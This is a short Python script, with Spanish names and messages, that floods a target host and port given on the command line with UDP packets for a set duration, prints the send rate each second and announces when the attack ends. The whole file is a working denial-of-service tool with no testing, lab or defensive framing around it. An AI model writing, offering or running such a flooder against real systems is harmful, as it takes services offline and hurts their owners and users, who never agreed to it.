import argparse
import socket
import time


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--destino", required=True)
    parser.add_argument("--puerto", type=int, required=True)
    parser.add_argument("--duracion", type=int, default=20)
    args = parser.parse_args()

    print(f"Lanzando UDP flood hacia {args.destino}:{args.puerto}")

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"A" * 512

    fin = time.time() + args.duracion
    contador = 0
    ultimo_reporte = time.time()
    ultimo_contador = 0

    while time.time() < fin:
        try:
            s.sendto(payload, (args.destino, args.puerto))
            contador += 1
        except Exception:
            pass

        ahora = time.time()
        if ahora - ultimo_reporte >= 1.0:
            print(f"Tasa actual: {contador - ultimo_contador} paquetes/segundo")
            ultimo_reporte = ahora
            ultimo_contador = contador

    print(f"Ataque finalizado. Paquetes enviados: {contador}")


if __name__ == "__main__":
    main()